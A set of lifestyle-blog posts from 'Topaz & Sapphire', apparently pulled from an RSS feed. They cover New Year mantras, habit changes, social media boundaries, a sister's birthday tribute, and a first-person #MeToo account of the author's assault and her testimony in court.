								<content:encoded><![CDATA[<p>Each new year offers the opportunity to become a better you &#8211; to reset and reevaluate goals. As we begin 2019, I&#8217;ve decided to share my 2019 mantras with all of you. By sharing my goals I hope to inspire you to set some of your own, so we can work together to be the women we&#8217;re proudest to be.</p>
<p>As in years past, I have chosen to stick to two <a href="https://topazandsapphire.github.io/a-new-year-a-new-motto/" target="_blank" rel="noopener">words to live by</a>: &#8220;consistency&#8221; and &#8220;unstoppable.&#8221; These words will dictate the overarching theme of my specific goals this year.</p>
<p><img class="alignnone size-large wp-image-1500" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-768x512.jpeg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>Through <strong>consistency </strong>I hope to build better and sustainable habits, while <strong>unstoppable </strong>encompasses all the bucket list items I wish to cross off this year. My only rule for creating my bucket list is that it can&#8217;t include anything I&#8217;ve already planned or booked already. (For example, if you signed up to run a half marathon in 2018 that takes place in 2019, you shouldn&#8217;t write &#8220;run a half marathon&#8221; on your list.)</p>
<p>Below are few examples of sub-goals and bucket list items I have made under each mantra. For me, making goals specific helps me to better follow through.</p>
<h2>Consistency</h2>
<ul>
<li>Less sugar. Think of desserts as a treat or something special, versus an everyday snack I&#8217;m entitled to</li>
<li>Build a better nightly routine</li>
<li>Less mobile media consumption &#8211; i.e. 40 minutes of Instagram per day</li>
<li>Journal more (at least 2x per month)</li>
<li>Go to bed each night with a clean kitchen</li>
</ul>
<h2>Unstoppable</h2>
<ul>
<li>Visit 12 new cities or unfamiliar places</li>
<li>Read 20 books</li>
<li>Visit 1 new country</li>
<li>Complete 1 photo project</li>
<li>Join some sort of hobby-related club</li>
<li>Send 2 snail mail letters per month</li>
</ul>
<p>While this isn&#8217;t an all encompassing list, hopefully some of these things can help you spark ideas for goals or bucket list items  your own. It&#8217;s understood that not all individuals are the same and do not set or establish goals the same way. For me, writing down a list of things holds me accountable. Rather than living by a mantra, you may prefer creating a bucket list or creating monthly goals vs. yearly goals.</p>
<p><img class="alignnone size-large wp-image-1502" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="907" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg 768w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-225x300.jpeg 225w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>However setting goals looks for you &#8211; embrace it! There is no right or wrong way to set goals. My only tip for setting New Year&#8217;s resolutions is to tell at least one other person your goals, whether that&#8217;s your mom, roomie, significant other, dog, etc. Telling someone else helps you feel more committed to your goals and gives you a greater sense of accountability in order to accomplish them. And remember, it&#8217;s never too late to set goals!</p>
<h2>The Importance of Setting Goals</h2>
<p>Setting goals has always been so important to me. With an <a href="https://www.enneagraminstitute.com/type-3" target="_blank" rel="noopener">achiever personality</a>, a lot of my self-satisfaction comes from achieving something, even if it&#8217;s small. Even without this type of personality, I find almost <em>all</em> people, whether they know it or not, feel their best when they have accomplished something they have worked toward. Whether that&#8217;s sleep training your baby, getting that promotion at work, or learning to bake a fluffy chocolate chip cookie &#8211; anytime you&#8217;re accomplishing something as an individual are moments you can look back on with fondness. Some of our proudest moments in life are when we&#8217;ve successfully completed something we&#8217;ve set our minds to accomplish or improve in ourselves, which is why it&#8217;s so important to set goals &#8211; big and small!</p>

<h3>A Special Shout Out to Our Readers</h3>

								<content:encoded><![CDATA[<p>Since the start of this year, I’ve focused less on resolutions and more on resolving to do and be better in general. Goals are great, but <b>habits are what bring about real change</b>. After all, goals are successfully attained as the result of habituated actions that help you reach them. I decided to focus more on changing certain habits and less on measurable goals, to see what happened. The result? An overall happier me. Here are six simple changes I made to my mentality, my routine, or my daily habits that have truly changed me for the better.</p>
<p>&nbsp;</p>
<h2>Going to bed at a set time &amp; waking up with positive intentions</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5.jpg"><img class="alignnone size-large wp-image-1400" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-1024x1024.jpg" alt="" width="680" height="680" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-1024x1024.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-150x150.jpg 150w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-300x300.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-768x768.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-80x80.jpg 80w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_QXRZLX36A5-120x120.jpg 120w" sizes="(max-width: 680px) 100vw, 680px" /></a></p>
<p>I am a natural night-owl, which usually makes for rough mornings. It’s especially hard for me to turn in at a decent hour on days where I feel like my whole day has been comprised of work and errands. I’d rather stay up to get in some much-needed “me” time. However, the gains don’t compensate for the losses I take the next day — in mood, energy level, or productivity. As an adult, it’s seems counterintuitive to give yourself a bedtime, but it’s worked wonders for me.</p>
<p>Going hand-in-hand with a decent bedtime, is getting up on the right side of the bed each morning. I do my best to wake up with positive intentions for the day, rather than grumble about work, the weather, wanting to sleep in, or any other negativity that may come all too easily when my soft sheets are begging me to stay. I say <i>intentions, </i>because life is not perfect and some days will go wrong, perkiness be damned. But after my dad had a very serious health scare last year, I realized that every day is not promised and I can control how I approach each morning.</p>
<p>&nbsp;</p>
<h2>Viewing exercise as a choice, not a chore</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender.jpg"><img class="alignnone wp-image-1402" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender.jpg" alt="" width="691" height="856" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender.jpg 749w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender-242x300.jpg 242w" sizes="(max-width: 691px) 100vw, 691px" /></a></p>

<p>How many times have you caught yourself saying, “I have to work out” when talking about exercise? Do you <i>have </i>to? Will you be penalized if you don’t? It seems silly to say “I get to work out,” but after I fractured my ankle two summers ago and was casted for three months, I realized what a privilege it is to have a fully functioning body.</p>
<p>Up until then, I had mostly viewed exercise at the very least, as a chore, and at the worst — as a punishment. Whether it was because I had only clocked in a couple sessions that week or had eaten something unhealthy, exercise was my recompense. If you know me, this may come as a surprise since I’m an avid exerciser. What a way to live, huh?! It’s like finding out an artist feels forced to pick up a paintbrush.</p>
<p>Being injured helped me realize that exercise is a choice and it’s my responsibility to view this positive choice in the positive light that it deserves — as a way to take care of myself, as an appreciation of my miraculous working body, and as a pathway to endorphins. It’s helped me become more committed to my workouts, even on days when they may not conveniently fit into my schedule.</p>
<p>&nbsp;</p>
<h2>Establishing social media boundaries</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_IFNJIWURN0.jpg"><img class="alignnone size-large wp-image-1404" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_IFNJIWURN0-1024x806.jpg" alt="" width="680" height="535" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_IFNJIWURN0-1024x806.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_IFNJIWURN0-300x236.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_IFNJIWURN0-768x605.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /></a></p>
<p>Social media is a tool that connects people all over the world. It helps businesses thrive, is a platform for people to make money, and provides inspiration in every category from interior design to the culinary arts.</p>
<p>But as everyone knows, there’s also a dark side to social media — comparison, online bullying, jealousy, and loss of productivity are just a few black holes of social media.</p>
<p>I’ll be the first to admit that I have found myself trapped in several of these black holes, whether it’s an absent-minded time suck or comparing my body to a model’s photoshopped perfection. In order to combat these pitfalls, I started to establish social media boundaries.</p>
<p>First, I unfollowed most bloggers, celebrities, and other people whose job it is to make their social media an effervescent highlight reel. The lives portrayed on social media by many who are getting paid to be influencers don’t depict all the realities of human life, and while there’s nothing wrong with this, it’s best for me to not subject myself to media masquerades on a daily basis. Second, I implemented “designated Instagram time” throughout my day. I try to stick to only checking my social media platforms at work in the morning, during my lunch break, and when I get home from work. It helps me be more in the moment, to not get distracted from work, and to still keep up with my Instagram fam in a way that feels healthy. Lastly, I periodically go on “fasts.” While the nature of my job makes it impossible to stay off of social media completely, I will spend a few weeks occasionally foregoing my personal accounts so that I can stay off the grid for awhile and just be me, without the hashtags.</p>
<p>What works for me may not be what works for you. Maybe you eat, live, sleep, and breathe social media without a problem or maybe you could care less about posting. The undeniable fact is that we live in a digital age inundated by Tweets, status updates, and photo sharing. I want to carve out my corner of the digital space, while also keeping my feet on solid (real world) ground, and this is how I accomplish that.</p>
<p>&nbsp;</p>
<h2>Swapping the T.V. remote for a book</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_GXMQHDSRCV.jpg"><img class="alignnone size-large wp-image-1405" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_GXMQHDSRCV-1024x576.jpg" alt="" width="680" height="383" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_GXMQHDSRCV-1024x576.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_GXMQHDSRCV-300x169.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/StockSnap_GXMQHDSRCV-768x432.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /></a></p>
<p>Growing up, I was the child under the covers with a flashlight reading into the night well past my bedtime. As a teenager, I never much minded summer reading for school and going to the library felt a little like Disney World. And then dial-up internet went obsolete and wifi happened. And then Netflix happened. And then Hulu happened. And then On Demand happened. And you know what? It became a lot less effort to watch anything I wanted at the tips of my fingers than to delve into a book.</p>
<p>Even though I once considered myself a bookworm, I had turned into a couch potato. It’s not to say that I didn’t read, because I did. But the amount of hours I spent bingeing a new series far outnumbered the amount of pages I was consuming — and it bothered me.</p>
<p>I told myself that I would read at least one book per month. Reading during my lunch hour and at least an hour before bed each night has helped me surpass this quota, and has also rekindled my love for the world that the written word opens up.</p>
<p>“The book is always better” because your imagination fills in all the holes a movie or T.V. show typically would for you. My imagination is my happy place and it’s fun to be a resident of it again.</p>
<p>&nbsp;</p>
<h2>Meal prepping every Sunday</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender2.jpg"><img class="alignnone wp-image-1406" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender2.jpg" alt="" width="680" height="767" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender2.jpg 742w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/FullSizeRender2-266x300.jpg 266w" sizes="(max-width: 680px) 100vw, 680px" /></a></p>

<p>If you ask me on a Sunday if I like meal prepping, the answer is, “Not really.” If you ask me Monday-Saturday if I like meal prepping, the answer is a resounding, “YAS!”</p>
<p>Meal prepping requires just that — preparation. Researching recipes, making a list of ingredients, and grocery shopping all have to happen before you even make the meal. All these things considered, meal prep takes up a valuable 4-5 hours of my weekend. But, I’m personally willing to sacrifice my Sunday evenings for a list of benefits that include:</p>
<ul>
<li>Spending quality time with my husband</li>
<li>Doing something that doesn’t involve a screen</li>
<li>Having healthy meals throughout the week</li>
<li>Saving money by not going out to eat for lunch during the work week</li>
<li>Not having to worry about “what’s for dinner” after a long day’s work</li>
</ul>
<p>Meal prepping essentially gives me time back during the work week when I need it most and clears my schedule for other things like workouts, down time, or time with friends.</p>
<p>&nbsp;</p>
<h2>Saying “yes” when it counts, and “no” when it matters</h2>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2018/05/Capture.png"><img class="alignnone wp-image-1407" src="https://topazandsapphire.github.io/wp-content/uploads/2018/05/Capture.png" alt="" width="651" height="972" srcset="https://topazandsapphire.github.io/wp-content/uploads/2018/05/Capture.png 545w, https://topazandsapphire.github.io/wp-content/uploads/2018/05/Capture-201x300.png 201w" sizes="(max-width: 651px) 100vw, 651px" /></a></p>
<p>I think the most valuable things you can give someone are your time and your word. If somebody asks for a favor, I rarely say no. While an admirable trait, it’s something that has caused me to feel overwhelmed on many occasions. I don’t like disappointing people and I tend to put a lot on my plate even when I know I should be delegating responsibilities. Additionally, as an introvert, I also feel a lot of pressure to speak up in meetings, go to happy hour after work when I’d rather go home, or fear I’m “wasting” my Saturday night in PJs when I should be out having fun.</p>
<p>I’ve been learning to say “yes” when it counts and “no” when it matters.</p>
<p>What I mean by this is, you should agree to things if:</p>
<ol>
<li>Another person could benefit, without doing physical/emotional/mental harm to yourself</li>
<li>You benefit from it — whether personally, professionally, spiritually, intellectually, mentally, etc.</li>
<li>It will cause you to grow in some way</li>
<li>It makes you feel good</li>
</ol>
<p>You should reject things that:</p>
<ol>
<li>Make you feel used, unappreciated, or highly uncomfortable</li>
<li>Cause you to feel emotional, physical, or mental distress</li>
<li>Hinder you or stall your growth</li>
<li>You don’t want to do (within reason)</li>
</ol>
<p>Skipping out on a social event for some alone time is okay. Skipping out on a phone conversation with your brother because you’d rather catch up on Game of Thrones, is not. Speaking up in a meeting, while uncomfortable, is something that you should practice — especially if you have something to contribute. Saying “no” to a toxic friendship doesn’t make you a bad person, and saying “yes” to everything doesn’t necessarily make you a good one.</p>
<p>These six simple changes don’t require a drastic amount of time, money, or effort, but rather decisiveness, discipline, and practice. Feel free to share in the comments changes that you’ve made in your life that have transformed you for the better.</p>

								<content:encoded><![CDATA[<p><span style="font-weight: 400; color: #000000;">“Me too.”</span></p>
<p><span style="color: #000000;">It’s such a validating statement. Just two simple words and boom — instant kinship and an evocation of mutual understanding.</span></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic.png"><img class="aligncenter wp-image-1328 size-full" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic.png" alt="metoographic" width="800" height="800" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic.png 800w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic-150x150.png 150w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic-300x300.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic-768x768.png 768w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic-80x80.png 80w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/metoographic-120x120.png 120w" sizes="(max-width: 800px) 100vw, 800px" /></a></p>
<p>&nbsp;</p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“Have you ever been to that sushi place on Main Street? I love that place!”</span></i></span></p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“Me too!”</span></i></span></p>
<p>&nbsp;</p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“Christmas is definitely my favorite holiday.”</span></i></span></p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“Me too, it seriously is the most wonderful time of the year.”</span></i></span></p>
<p>&nbsp;</p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“I was sexually assaulted.”</span></i></span></p>
<p><span style="color: #000000;"><i><span style="font-weight: 400;">“Me too.”</span></i></span></p>
<p>&nbsp;</p>
<p><span style="color: #000000;"><span style="font-weight: 400;">That last couplet is an echo that has been sweeping the nation (and beyond) in the aftermath of the </span><span style="font-weight: 400;">stories women have been coming forward with regarding media mogul Harvey Weinstein.</span></span></p>
<p><span style="color: #000000;">Actress Alyssa Milano’s “me too” response tweet soon went viral with thousands of women relaying their own personal stories of sexual assault. Some kept their revelations straightforward with a simple “#MeToo” and nothing else.</span></p>
<p><span style="color: #000000;"><span style="font-weight: 400;">But there is nothing simple about this. The mass response of </span><i><span style="font-weight: 400;">just those who felt comfortable sharing their stories </span></i><span style="font-weight: 400;">exemplifies the magnitude of the problem surrounding rape culture and sexual assault.</span></span></p>
<p><span style="color: #000000;">This is not a Harvey Weinstein thing. This is not a Bill Cosby thing. This is not an aberrational thing.</span></p>
<blockquote>
<h3><span style="font-weight: 400; color: #000000;">What this is, is an epidemic. </span></h3>
</blockquote>
<p><span style="color: #000000;"><span style="font-weight: 400;">It’s a silent killer. It is embedded into the fabric of our society. It’s how women are portrayed in the media. It’s the fact that women still get paid 79 cents for every dollar a man earns. It’s how a painful disclosure instantly becomes a game of “he said, she said,” but most people make up their minds about the truth before a woman even finishes her sentence. It’s the law requesting proof, when oftentimes, the damage took place years prior and all a woman has to show for it are invisible scars on her soul and those don’t hold up court. </span><a style="color: #000000;" href="https://www.theatlantic.com/politics/archive/2016/02/how-sex-trafficking-goes-unnoticed-in-america/470166/"><span style="font-weight: 400;">It is a $150 billion global human trafficking industry, including 4,000 </span><i><span style="font-weight: 400;">reported</span></i><span style="font-weight: 400;"> cases per year in the United States</span></a><span style="font-weight: 400;">. It is a person (whether a child, adult, male, female, trans, or an agender identifying person) feeling like their assault is either too shameful, too “trivial,” or too futile to report.</span></span></p>
<p><span style="color: #000000;">So here I am, saying “me too.”</span></p>
<p><span style="color: #000000;">I was assaulted in February.</span></p>
<p><span style="color: #000000;">It was an unseasonably warm afternoon and my husband and I had decided to go the pool to read. We found some tables in the shade to sit at and flipped open our books. We had only been there for 10 minutes when my husband spotted a man who lived in our apartment complex, whom we’d been formerly acquainted with, coming through the pool entrance gates. My husband warned me of this sighting and I instantly tensed up because our previous interactions with this man had left me very uncomfortable.</span></p>
<p><span style="color: #000000;">This man was extremely overly friendly, gave me very unsettling vibes, and to be honest — just seemed kind of off. I always tried to be polite to him when I would see him in a common area of the community, as did my husband, but we did our best to avoid this otherwise complete stranger if and when possible.</span></p>
<p><span style="color: #000000;">“It looks like he’s coming over here,” my husband said in a nervous, hushed tone.</span></p>
<p><span style="color: #000000;">As my back was facing this man, I did not see him approach, but I did hear his voice as he called out a greeting to my husband.</span></p>
<p><span style="color: #000000;">And then in an instant this man was behind me, with his left hand on my left shoulder and his right hand firmly cupping my right breast — like he belonged there. Like it was nothing.</span></p>
<p><span style="color: #000000;">In a flash I can barely remember, my husband stood up and grabbed this man and pulled him away from me. I tried to steady my breath. My heart seemed to beat a million miles per second in the pit of my stomach. I was in complete shock.</span></p>
<p><span style="color: #000000;">The entire thing lasted perhaps 30 seconds.</span></p>
<p><span style="color: #000000;">After calling the police, we learned that there was a warrant out for this man’s arrest after he’d exposed himself to four underage girls at a public restaurant. He’d also assaulted various other women at the community pool in a similar manner that day. According to authorities, he suffers from mental illness and had stopped taking his medication and had been acting out as a result.</span></p>
<p><span style="color: #000000;">The brief experience left me feeling scared, confused, guilty and upset.</span></p>
<p><span style="color: #000000;"><b>Scared</b><span style="font-weight: 400;">, because I had done nothing to “entice” this man. I was fully clothed at the pool. In fact, I was wearing a sweater. I was also with my husband. I was surrounded by people. I was in a public setting. (So, if anyone tells you that you are dressing too provocatively, or that you shouldn’t go somewhere by yourself, or that it wouldn’t have happened if you weren’t drinking, or that you’re asking for it if you go to a private location with someone — I hope you tell them that it can happen anywhere, at any time, to anybody and to unlearn the bullshit they’ve been force-fed.) I found myself frequently checking the locks on all the windows and doors in our apartment and having anxiety each time I left my apartment alone.</span></span></p>
<p><span style="color: #000000;"><b>Confused</b><span style="font-weight: 400;">, because I felt deeply violated by this man but also had sympathy for him because he wasn’t in a mental state to make the best decisions. Should I feel sorry for him? Should I hate him? Could both feelings coexist inside me simultaneously? Why did I now feel oddly linked to a complete stranger? It made me feel dirty.</span></span></p>
<p><span style="color: #000000;"><b>Guilty</b><span style="font-weight: 400;">, because I was one of the “lucky” ones. My assault “really wasn’t that bad.” The experience didn’t last long. It was “just a boob tap.” There were even witnesses. It wasn’t like I had been raped. Why was I complaining? I should be grateful that this is the worst thing that’s happened to me because other women have had it so much worse.</span></span></p>
<p><span style="color: #000000;"><b>Upset</b><span style="font-weight: 400;">, because well, I was assaulted. And it brought up memories. Memories that aren’t even my own.</span></span></p>
<p><span style="color: #000000;">My mother was gang raped at the age of 19. Hers is not my story to tell, but it is a complicated and heart-wrenching one and it doesn’t have an ending. My mother’s experience has taught me that sexual assault does not have to write the chapters of your life, but it certainly influences them. It’s the reason she has an inherent need to be in control. It’s the reason she had a PTSD episode in a group boxing class in her 40s when she witnessed someone “defending” themselves against four assailants. It’s the reason she can’t watch certain television shows. It’s the reason she never let us have sleepovers growing up.</span></p>
<p><span style="color: #000000;">And it’s the reason why I took out a restraining order against the man who “barely” sexually assaulted me and testified against him in court. I did it for my mother. I did it for the four underage girls at a public restaurant who will forever have to remember a man’s unwanted advances. I did it for any potential women this man could have further assaulted had his behavior escalated. I did it for the girls and boys being molested in some dark corner, because it’s happening somewhere as I write this.</span></p>
<p><span style="color: #000000;">I did it because one of my high school teachers put his hand on my back too often and once complimented me on my looks. I did it because a teenage boy once threw dollar bills at me as he catcalled me as I passed him by on the sidewalk. I did it for the time I was on a run and four men in a vehicle barked and howled at me as they wagged their tongues. I did it for the time I was walking a New York City sidewalk while eating a popsicle and a construction worker I passed by muttered that I “licked it so well” as the rest of his crew laughed. I did it for all the times I was called something derogatory for not reciprocating a man’s flirtations or for my refusal to dance with a man in a nightclub.</span></p>
<p><span style="color: #000000;">I did it for me. And I did it for you.</span></p>
<p><span style="color: #000000;">The man who assaulted me is being held accountable.</span></p>
<p><span style="font-weight: 400; color: #000000;">The men who raped my mom got away with it. A lot of men do. </span></p>
<p><span style="color: #000000;">But they didn’t get away with my mom.</span></p>
<p><span style="color: #000000;">And we won’t let any man or assaulter get the best of us.</span></p>

								<content:encoded><![CDATA[<p>Scroll, scroll, scroll&#8230; The story of our lives right?</p>
<p>Instagram is a world full of illusionary filters, life comparisons, and if we&#8217;re being honest &#8211;  it can waste a lot of time we could be using doing more productive things. But, it can also be a great tool for inspiration and keeping in touch with family and friends.</p>

				<description><![CDATA[<p>2015 was one for the books, but Topaz &#38; Sapphire are ready for a fresh slate and to kick off the new year with a new motto to live by.</p>

								<content:encoded><![CDATA[<p>I can&#8217;t believe 2015 is nearly over. While it has been a rewarding year for me personally and a rewarding year for Topaz &amp; Sapphire (can you believe we only <a href="https://topazandsapphire.github.io/welcome/">launched</a> just this year?!), there is something refreshing about starting a new year with a clean slate.</p>
<p>As an ambitious woman, I am all about setting long-term and short-term goals, however, I&#8217;ve found that living by a new theme each year really helps me become the person I am striving to be.</p>
<p>This past year, I decided to live by a two-word theme: <strong>ADVENTURE</strong> and <strong>EMBRACE</strong>. 2015 was full of adventure as I traveled to nearly 15 new cities (<a href="https://topazandsapphire.github.io/things-to-do-in-kauai-hi/">Kauai</a> being my favorite and <a href="https://topazandsapphire.github.io/amsterdam-things-to-do/">Amsterdam</a> coming in as a close second). I also <a href="https://topazandsapphire.github.io/newbie-half-marathon-training-tips/">trained</a> and <a href="https://topazandsapphire.github.io/nantucket-half-marathon/">ran my very first half marathon</a>.</p>
<p>2015 was also full of a lot of change as I started a new job and <a href="https://topazandsapphire.github.io/moving/">moved cross-country</a> to the City of Oaks. I strived to take on change and embrace it with an optimistic attitude.</p>
<p>2015 was one for the books, but both Sapphire and I are ready for a fresh start and a new theme to live by: <strong>GIVE</strong> (for me) and <strong>ACCEPTANCE</strong> (for her).</p>
<h2>Why Choose A Motto To Live By?</h2>
<p>While it is important to set goals, setting a theme or motto to live by in the new year will help shape you as a person while also helping you meet your smaller and bigger milestones. Instead of beating yourself up about skipping a day at the gym or indulging in that Krispy Kreme donut, try thinking of the big picture and your theme for your year.</p>
<p>Statistically, 92 percent of people did not keep their New Year&#8217;s resolutions last year. For me, it&#8217;s much more gratifying and attainable to live by a motto that continuously inspires my everyday actions rather than becoming discouraged when it&#8217;s June and I haven&#8217;t even made a dent in the list of resolutions I put on paper in January.</p>
<p>Choosing your own motto to live by for a year also helps you focus on yourself, and not other people. It is often easy to compare your worst self to other people&#8217;s best selves, especially <a href="https://topazandsapphire.github.io/the-battle-of-social-media/">via social media</a>. This year try to focus on you and your own goals. Be inspired by others, but don&#8217;t feel like you need to compete with them. Compete against yourself- you are your biggest advocate and your strongest competitor.</p>

								<content:encoded><![CDATA[<p>As cliche as it might sound, my sister’s Topaz birthstone is as warm and sunny as she is.</p>
<p>She brightened my life the moment she entered the world with her head full of dark hair and her gummy smile. My parents warned me that Cassie wouldn’t be able to play or run around for awhile, but I was content to just have my arm around her carseat as she kept me company during my morning cartoons.</p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/11/MG_7379-copy.jpg"><img class="alignnone size-large wp-image-726" src="https://topazandsapphire.github.io/wp-content/uploads/2015/11/MG_7379-copy-1024x683.jpg" alt="_MG_7379 copy" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/11/MG_7379-copy-1024x683.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2015/11/MG_7379-copy-300x200.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/11/MG_7379-copy.jpg 1500w" sizes="(max-width: 680px) 100vw, 680px" /></a></p>
<p>Soon enough we were playing pretend and dress-up and getting into all kinds of adventures. And as we grew up, we only grew closer. She was there for every milestone and every heartbreak. (She can still rattle off the names of all my crushes from elementary school through high school &#8211; much to my utter dismay). I vividly remember her pig collection, the time she got stitches in her chin, and the moment she danced with our dad at her wedding. The memories are numerous.</p>
<p>Some of the best times I’ve had with my sister have been lying in bed side-by-side talking and laughing until the wee hours of the morning. Watching her, a beautiful dancer, take the stage. Driving in the car and singing Nick Lachey’s “What’s Left of Me” at the top of our lungs, even though we have no recollection of how the mediocre pop ballad became our song.</p>
<p>Though her elder sister, I am constantly learning from her and am amazed by her positivity and zest for life, the way she sets actionable goals, her ability to hold a friendly conversation with almost anyone she meets, and the way that only she can make me feel heroic in times of strife.</p>
<p>Growing up with Cassie was a blessing and getting older with her is a privilege. It’s been an honor these past 24 years to be her big sister, her best friend, and her forever confidant.</p>
<p>Happy birthday baby girl! I love you infinitely.</p>

<p>You know that age old saying, “Actions speak louder than words”?</p>
<p>I don’t think it could be more true or more pertinent than in this day and age.</p>
<p><b><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/11/More-action-Less-Posting.jpg"><img class="aligncenter wp-image-718 size-full" title="Topaz and Sapphire More action, Less Posting" src="https://topazandsapphire.github.io/wp-content/uploads/2015/11/More-action-Less-Posting.jpg" alt="More action, Less Posting" width="560" height="315" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/11/More-action-Less-Posting.jpg 560w, https://topazandsapphire.github.io/wp-content/uploads/2015/11/More-action-Less-Posting-300x169.jpg 300w" sizes="(max-width: 560px) 100vw, 560px" /></a></b></p>
<p>Recently, I’ve become inundated with society’s need to use status bars as the primary method of issuing stances on topics such as politics, religion, and/or current events. In the age of social media, it seems everyone is a critic or social commentator of sorts writing an op-ed.</p>
<p>Let me be clear- there is absolutely nothing wrong with having an opinion and/or conviction and feeling inclined to share it. Words are powerful. (I am a writer after all, hence this article). Words are a tool by which people can convey sentiments, thoughts, and opinions in an impactful way that also create lasting memories. Words are important. But so are actions.</p>
<p>If you want to take a stand for something, by all means, TAKE that stand. But literally, get up and off of the computer, and take an actionable stand with your body and mind (not just your fingertips in 140 characters or less).</p>
<p>What good ever came from getting into a debate via a Facebook thread? I’m telling you right now, whatever issue the argument stemmed from, it is not going to get resolved through your back-and-forth notifications.</p>
<p>Instead, try volunteering for your cause, attend a community discussion forum on issues you&#8217;re concerned about, submit an actual opinion piece to your local newspaper that requires research and thought, or simply turn off your device and think of ways in which you can be a real advocate for your ideals.</p>
<p>We all want to be heard- it’s human nature. If we feel strongly about something chances are we want to convey those sentiments, especially in this generation of virtual  “sharing.” Social media is a great way to disseminate information quickly and efficiently. It’s also a system that gives rise to complacency, because if we let people know we support/oppose something, we sometimes feel as if we have done enough. (I myself am completely guilty of this on occasion).</p>
<p>I’m committing myself to more action and less posting.</p>
<p>Imagine if people were as raptly inclined to go out into the community and take action, as they are to post about what’s in their hearts and on their minds.</p>
<p>Your status won’t change the world, but you can.</p>

She <a href="https://www.youtube.com/watch?v=Xe1Qyks8QEM" target="_blank">confesses via YouTube</a> that social media is &#8220;not real life&#8221; and she feels that her &#8220;happiness&#8221; was only derived by the number of likes and followers she saw on Instagram. Although it appears that she lives a glamorous and dreamy lifestyle, she claims that her life was only staged to look that way. On the inside she felt anxious, depressed, and lonely. She wasn&#8217;t doing things in real life for herself; she was doing things for her fans on Instagram.</p>

<p>&nbsp;</p>
<h2>The Effects of Social Media</h2>
<p>While social media is a great tool to build a brand&#8217;s presence, engage with customers and fans, and keep up-to-date with current events and news, it can be detrimental if used in excess. I mean look what happened to O&#8217;Neill at only 18 years old.</p>
<p>Social media can sometimes result in people living their lives only for their virtual followers. The obsession of social media numbers make people forget about enjoying real life with real people.</p>
<h2>Using Social Media Appropriately</h2>
<p>So how do you use social media appropriately? No one can tell you exactly how to use Instagram or Facebook or Tumblr or Twitter. That&#8217;s up to you &#8211; only you have the ability to post (or not post), or to unplug from your virtual followers.</p>
<p>For me, using social media is all about balance. As aforementioned, social media can be a great tool, but I only want to use it as an outlet for memories and/or a way to connect with friends and family I don&#8217;t see often.</p>
<p>Here is a list of things I do to make sure using social media doesn&#8217;t take over my real life:</p>
